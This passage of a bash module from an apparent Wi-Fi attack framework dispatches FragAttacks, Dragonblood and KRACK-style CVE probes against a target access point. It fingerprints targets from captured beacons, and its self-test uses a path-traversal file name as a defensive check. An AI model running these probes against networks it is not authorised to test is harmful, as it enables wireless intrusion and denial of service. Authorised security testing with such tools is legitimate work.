        echo "usage: $0 --run-cve <CVE-ID>" >&2
        return 2
    fi
    # NOTE: do not `exec </dev/null` here — it replaces the shell and the
    # case dispatch never runs.
    WIFISTING_CVE_RUN=1
    export WIFISTING_CVE_RUN
    info "CVE probe start: $id  (non-interactive)"
    info "log: $WIFI_CVE_LOG"

    case "$id" in
        CVE-2020-24588) wifi_cve_run_fragattacks amsdu-inject ;;
        CVE-2020-24587) wifi_cve_run_fragattacks mixedkey ;;
        CVE-2020-24586) wifi_cve_run_fragattacks fragcache ;;
        CVE-2020-26145) wifi_cve_run_fragattacks eapfrag ;;
        CVE-2020-26139) wifi_cve_26139_eapol_plaintext ;;
        CVE-2020-26144) wifi_cve_26144_amsdu_plaintext ;;
        CVE-2020-26140) wifi_cve_26140_frag_plain ;;
        CVE-2020-26142) wifi_cve_26142_bcast_eapol ;;
        CVE-2020-26137|CVE-2020-26138) wifi_cve_26137_38_deauth_protected ;;
        CVE-2020-26146)
            wifi_cve_run_handoff "$id" "aggregated-fragment non-consecutive-seq variant — use fragattacks 'fragcache' plus manual seq analysis" ;;
        CVE-2019-9494)  wifi_cve_run_dragonblood timing ;;
        CVE-2019-13377) wifi_cve_run_dragonblood timing ;;
        CVE-2019-9495)
            wifi_cve_run_handoff "$id" "cache side-channel ('boil') needs local access on the target — not runnable remotely" ;;
        DragonShift)
            wifi_cve_run_handoff "$id" "WPA3→WPA2 transition downgrade — use hostapd-mana downgrade in module 04 (evil twin)" ;;
        CVE-2022-47522)
            wifi_cve_run_handoff "$id" "needs a victim client MAC — lock a client in recon and run the full MacStealer flow from the menu" ;;
        CVE-2023-52424)
            wifi_cve_run_handoff "$id" "SSID Confusion — use hostapd-mana (module 04) to advertise the trusted network" ;;
        CVE-2023-24023)
            wifi_cve_run_handoff "$id" "BLUFFS session-key derivation — passive capture + offline analysis; see fragattacks/docs" ;;
        CVE-2017-13077|CVE-2017-13078|CVE-2017-13079|CVE-2017-13080|CVE-2017-13081|CVE-2017-13082)
            wifi_cve_run_handoff "$id" "KRACK nonce-reuse probe is implemented in module 11 (krack_kr00k)" ;;
        CVE-2019-15126)
            wifi_cve_run_handoff "$id" "Kr00k null-key disassoc probe is implemented in module 11 (krack_kr00k)" ;;
        CVE-2025-27558)
            wifi_cve_run_handoff "$id" "Mesh FragAttack — pending PoC integration" ;;
        CVE-2024-41992)
            wifi_cve_run_handoff "$id" "Wi-Fi Test Suite RCE — local test-suite harness, pending integration" ;;
        CVE-2026-58374)
            wifi_cve_run_handoff "$id" "Wi-Fi 7 MLO RCE — pending PoC integration" ;;
        CVE-2026-78807)
            wifi_cve_run_handoff "$id" "wpa_supplicant PMF bypass — needs a supplicant-under-test harness" ;;
        CVE-2019-5062)
            wifi_cve_run_handoff "$id" "hostapd 802.11w DoS — passive+active probe, pending integration" ;;
        CVE-2026-26048)
            wifi_cve_run_handoff "$id" "PMF-less deauth for IoT — use module 03 deauth with protected-frame off" ;;
        CSA-Spoofing)
            wifi_cve_run_handoff "$id" "CSA spoofing PMF bypass — pending PoC integration" ;;
        *)
            err "unknown CVE id: $id"
            return 2 ;;
    esac
}

# ── beacon-IE fingerprint → list of applicable CVEs ──
wifi_cve_fingerprint_bssid() {
    local dur="${1:-15}"

    # Resolve the monitor interface from the SHARED state dir. This used to
    # call krack_require_mon, which is defined in 11_krack_kr00k.sh and is not
    # available here — the `2>/dev/null || true` swallowed the resulting
    # command-not-found, so MON_IFACE stayed empty and this function always
    # failed with "no monitor iface" no matter what was configured.
    if [[ -z "${MON_IFACE:-}" ]]; then
        local f
        for f in "$TMP_DIR/mon_iface" "$TMP_DIR/wifi_iface" \
                 "$TMP_DIR/selected_iface"; do
            [[ -f "$f" ]] || continue
            MON_IFACE="$(head -n1 "$f" 2>/dev/null | tr -d '[:space:]')"
            [[ -n "$MON_IFACE" ]] && break
        done
        export MON_IFACE
    fi
    [[ -z "${MON_IFACE:-}" ]] && {
        printf 'ERROR\tno monitor iface\n' >&2; return 1
    }
    command -v tshark >/dev/null 2>&1 || {
        printf 'ERROR\tno tshark\n' >&2; return 1
    }

    # Pull the target from shared state if the caller did not supply one.
    wifi_cve_require_target || return 1

    # Claim the adapter only once the run is definitely going ahead. This was
    # previously nested INSIDE the "no target" guard, so it ran only on the
    # error path and the happy path never took the lock.
    iface_lock_claim "$MON_IFACE" "15_wifi_cve_scan" || return 1

    local tmp
    tmp="$TMP_DIR/cve_fp_$(date +%s).pcap"
    iw dev "$MON_IFACE" set channel "${TARGET_CHANNEL:-1}" 2>/dev/null || true
    timeout "$dur" tcpdump -i "$MON_IFACE" -w "$tmp" \
        'wlan type mgt subtype beacon' >/dev/null 2>&1

    if [[ ! -s "$tmp" ]]; then
        printf 'ERROR\tno beacons captured\n' >&2
        return 1
    fi

    # Extract capability bits from the beacon
    local rsn mfpr mfpc akm cipher vendor_oui
    rsn=$(tshark -r "$tmp" -Y "wlan.bssid == $TARGET_BSSID" \
        -T fields -e wlan.rsn.pcs.type -e wlan.rsn.akms.type 2>/dev/null | head -1)
    mfpr=$(tshark -r "$tmp" -Y "wlan.bssid == $TARGET_BSSID" \
        -T fields -e wlan.rsn.capabilities.mfpr 2>/dev/null | head -1)
    mfpc=$(tshark -r "$tmp" -Y "wlan.bssid == $TARGET_BSSID" \
        -T fields -e wlan.rsn.capabilities.mfpc 2>/dev/null | head -1)
    vendor_oui=$(tshark -r "$tmp" -Y "wlan.bssid == $TARGET_BSSID" \
        -T fields -e wlan.tag.vendor.oui 2>/dev/null | sort -u | head -5 | tr '\n' ',')

    printf 'BSSID\t%s\n' "$TARGET_BSSID"
    printf 'RSN\t%s\n' "$rsn"
    printf 'PMF_REQUIRED\t%s\n' "${mfpr:-0}"
    printf 'PMF_CAPABLE\t%s\n' "${mfpc:-0}"
    printf 'VENDOR_OUIS\t%s\n' "$vendor_oui"

    # Map to applicable CVEs
    printf '\n== applicable CVEs to test ==\n'

    # PMF off → deauth-based tests work
    if [[ "${mfpr:-0}" == "0" ]]; then
        printf 'CVE-2020-26137\tdeauth/disassoc without PMF protection\n'
        printf 'CVE-2020-26138\tprotected-flag deauth accepted\n'
    fi

    # WPA3 present → Dragonblood
    if echo "$rsn" | grep -qi "SAE\|19\|8"; then
        printf 'CVE-2019-9494\tdragonblood SAE timing (WPA3)\n'
        printf 'CVE-2019-9495\tdragonblood SAE cache (WPA3)\n'
        printf 'DragonShift\tWPA3->WPA2 downgrade\n'
    fi

    # WPA2 present → KRACK + FragAttacks
    if echo "$rsn" | grep -qi "CCMP\|TKIP\|WPA2\|4\|2"; then
        printf 'CVE-2017-13077\tKRACK 4-way handshake\n'
        printf 'CVE-2020-24586\tFragAttacks fragment cache\n'
        printf 'CVE-2020-24587\tFragAttacks mixed key\n'
        printf 'CVE-2020-24588\tFragAttacks A-MSDU spoof\n'
        printf 'CVE-2020-26139\tplaintext EAPOL pre-assoc\n'
        printf 'CVE-2020-26140\tplaintext fragmented data\n'
        printf 'CVE-2020-26142\tbcast addr1 EAPOL\n'
        printf 'CVE-2020-26144\tplaintext A-MSDU\n'
        printf 'CVE-2020-26145\tplaintext EAPOL as bcast\n'
        printf 'CVE-2020-26146\taggregated frag non-consecutive seq\n'
    fi

    # OUI-based heuristics
    case "$TARGET_BSSID" in
        70:B3:D5:*|B8:27:EB:*|DC:A6:32:*|*:*:*:*) ;;
    esac
    if [[ "${TARGET_BSSID:0:8}" =~ ^(70:B3:D5|B8:27:EB|DC:A6:32)$ ]]; then
        printf 'CVE-2019-15126\tKr00k (Broadcom/Cypress)\n'
    fi

    # Mesh / MLO hints
    if echo "$vendor_oui" | grep -qi "5c:17:d4\|bc:1b:bc"; then
        printf 'CVE-2025-27558\tMesh FragAttack candidate\n'
    fi

    rm -f "$tmp"
    return 0
}

# ── iface arbitration ──
# Monitor-only modules compete for one adapter; 01_iface.sh owns the lock.
IFACE_MODULE="$WIFISTING_ROOT/modules/01_iface.sh"
IFACE_LOCK_IFACE=""
iface_lock_release() {
    [[ -n "$IFACE_LOCK_IFACE" ]] || return 0
    "$IFACE_MODULE" --lock-release "$IFACE_LOCK_IFACE" $$ >/dev/null 2>&1
    IFACE_LOCK_IFACE=""
}
# For BLOCKING commands only (the CLI process lives as long as the capture),
# so $$ is the correct holder. The EXIT trap matters: without it a failure
# path that exits directly leaves a ghost lock and blocks every later module.
iface_lock_claim() {
    [[ -x "$IFACE_MODULE" ]] || return 0
    local out
    if ! out=$("$IFACE_MODULE" --lock-claim "$1" "$2" $$ 2>&1); then
        printf 'ERROR\tinterface busy\n%s\n' "$out" >&2
        return 1
    fi
    IFACE_LOCK_IFACE="$1"
    trap iface_lock_release EXIT
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no monitor iface, no target, no frames, no root. Nothing
# here may reach a `read -rp` prompt — every interactive path is either
# given /dev/null on stdin or avoided entirely. Notes are written to a
# scratch loot dir, never to loot/cves/wifi.
wifi_cve_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    cfld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    local MOD_TMP="$TMP_DIR/wifi_cve_selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP/empty" "$MOD_TMP/loot"
    local save_loot="$WIFI_CVE_LOOT" save_tmp="$TMP_DIR"
    WIFI_CVE_LOOT="$MOD_TMP/loot"
    TMP_DIR="$MOD_TMP/empty"

    # ── dependency probe ──
    chk dep-check-present "$(wifi_cve_dep_check bash; echo $?)" "0"
    local depout rc=0
    depout=$(wifi_cve_dep_check bash wf-selftest-nope wf-selftest-nope2 2>&1) || rc=$?
    chk dep-check-missing-rc "$rc" "1"
    chk dep-check-missing-names "$depout" \
        "[err]  missing: wf-selftest-nope wf-selftest-nope2"

    # ── the confirmation gate must default to NO ──
    # Auto-approval is only allowed when the caller explicitly opted in.
    WIFISTING_CVE_RUN=1
    local rc2=0
    wifi_cve_confirm 'selftest' >/dev/null 2>&1 || rc2=$?
    unset WIFISTING_CVE_RUN
    chk confirm-auto-approve-rc "$rc2" "0"
    rc2=0
    wifi_cve_confirm 'selftest' </dev/null >/dev/null 2>&1 || rc2=$?
    chk confirm-refuses-without-yes "$([[ $rc2 -ne 0 ]] && echo refused || echo approved)" "refused"

    # ── target / iface resolution from shared state ──
    unset TARGET_BSSID TARGET_ESSID TARGET_CHANNEL WIFI_IFACE
    rc2=0; wifi_cve_require_target >/dev/null 2>&1 || rc2=$?
    chk require-target-missing-rc "$rc2" "1"
    rc2=0; wifi_cve_require_iface >/dev/null 2>&1 || rc2=$?
    chk require-iface-missing-rc "$rc2" "1"

    printf 'E4:9E:12:05:34:59\n' > "$TMP_DIR/target_bssid"
    printf 'MyNet\n'             > "$TMP_DIR/target_essid"
    printf '6\n'                 > "$TMP_DIR/target_channel"
    wifi_cve_require_target
    chk require-target-rc "$?" "0"
    chk require-target-bssid "$TARGET_BSSID" "E4:9E:12:05:34:59"
    chk require-target-essid "$TARGET_ESSID" "MyNet"
    chk require-target-channel "$TARGET_CHANNEL" "6"

    # ── handoff notes: content, and a slug that cannot escape the loot dir ──
    local hout
    hout=$(wifi_cve_run_handoff 'CVE-2026-26048' 'PMF-less deauth' 2>/dev/null)
    chk handoff-rc "$?" "0"
    chk handoff-cve-line "$(grep -c '^cve: CVE-2026-26048$' <<<"$hout")" "1"
    chk handoff-status-line "$(grep -c '^status: handoff' <<<"$hout")" "1"
    chk handoff-note-line "$(grep -c '^note: PMF-less deauth$' <<<"$hout")" "1"
    chk handoff-file-written "$(find "$WIFI_CVE_LOOT" -maxdepth 1 -name 'run_CVE-2026-26048_*.txt' | wc -l)" "1"

    wifi_cve_run_handoff 'CVE-1/../../../../tmp/wf_selftest_pwned' 'traversal probe' >/dev/null 2>&1
    local trav
    trav=$(basename "$(find "$WIFI_CVE_LOOT" -maxdepth 1 -name 'run_CVE-1*' | head -1)")
    chk handoff-traversal-slug "$(grep -cE '^run_CVE-1_\.\._\.\._\.\._\.\._tmp_wf_selftest_pwned_[0-9]+\.txt$' <<<"$trav")" "1"
    chk handoff-traversal-contained "$([[ -e /tmp/wf_selftest_pwned ]] && echo escaped || echo contained)" "contained"
    chk handoff-slug-has-no-slash "$(grep -c '/' <<<"$trav")" "0"

    # ── --run-cve dispatch ──
    rc=0; wifi_cve_run '' >/dev/null 2>&1 || rc=$?
    chk run-empty-id-rc "$rc" "2"
    rc=0; wifi_cve_run 'CVE-9999-00000' >/dev/null 2>&1 || rc=$?
    chk run-unknown-id-rc "$rc" "2"
    rc=0; wifi_cve_run 'CVE-2026-26048' >/dev/null 2>&1 || rc=$?
    chk run-handoff-id-rc "$rc" "0"
    # --run-cve is documented as non-interactive: it opts into auto-approval.
    chk run-sets-noninteractive-flag "$WIFISTING_CVE_RUN" "1"
    unset WIFISTING_CVE_RUN

    # ── status TSV contract ──
    local st
    st=$(wifi_cve_cli_status_tsv)
    chk status-tsv-rows "$(grep -c . <<<"$st")" "9"
    chk status-tsv-bssid "$(cfld bssid <<<"$st")" "E4:9E:12:05:34:59"
    chk status-tsv-loot "$(cfld loot <<<"$st")" "$WIFI_CVE_LOOT"
    chk status-tsv-fragatk "$(cfld fragatk <<<"$st")" \
        "$([[ -d "$WIFI_CVE_EXT/fragattacks" ]] && echo yes || echo no)"

    rc=0; wifi_cve_cli_main --no-such-flag >/dev/null 2>&1 || rc=$?
    chk unknown-command-rc "$rc" "2"

    unset TARGET_BSSID TARGET_ESSID TARGET_CHANNEL WIFI_IFACE
    WIFI_CVE_LOOT="$save_loot"; TMP_DIR="$save_tmp"
    rm -rf "$MOD_TMP"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

wifi_cve_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)     wifi_cve_cli_status_tsv ;;
        --run-cve)        wifi_cve_run "${1:-}" ;;
        --fingerprint-bssid) shift; wifi_cve_fingerprint_bssid "$@" ;;
        --selftest)       wifi_cve_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 --status-tsv
       $0 --run-cve <CVE-ID>
       $0 --fingerprint-bssid [DURATION]
       $0 --selftest              offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    : "${TMP_DIR:=/tmp/wifisting}"
    : "${LOOT_DIR:=$HOME/wifisting/loot}"
    : "${LOGS_DIR:=$HOME/wifisting/logs}"
    : "${WIFISTING_HOME:=$HOME/wifisting}"
    : "${WIFISTING_ROOT:=$HOME/wifisting}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    wifi_cve_cli_main "$@"
fi
